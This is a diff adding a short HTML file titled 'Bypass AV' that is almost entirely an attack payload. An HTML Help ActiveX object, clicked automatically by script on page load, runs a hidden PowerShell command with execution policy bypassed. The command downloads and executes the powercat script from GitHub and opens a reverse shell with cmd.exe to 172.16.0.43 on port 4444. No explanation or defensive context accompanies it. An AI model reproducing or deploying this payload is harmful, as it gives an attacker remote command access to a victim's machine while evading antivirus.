@@ -1,0 +1,21 @@
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
+<HTML>
+<HEAD>
+<Title>Bypass AV</Title>
+</HEAD>
+<BODY>
+
+<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
+<PARAM name="Command" value="ShortCut">
+ <PARAM name="Button" value="Bitmap::shortcut">
+ <PARAM name="Item1" value=",cmd.exe,/c C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoLogo -NoProfile IEX ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')); powercat -c 172.16.0.43 -p 4444 -e cmd.exe">
+ <PARAM name="Item2" value="273,1,1">
+</OBJECT>
+
+<SCRIPT>
+x.Click();
+</SCRIPT>
+
+<h1> Bypass AV</h1>
+</BODY>
+</HTML>
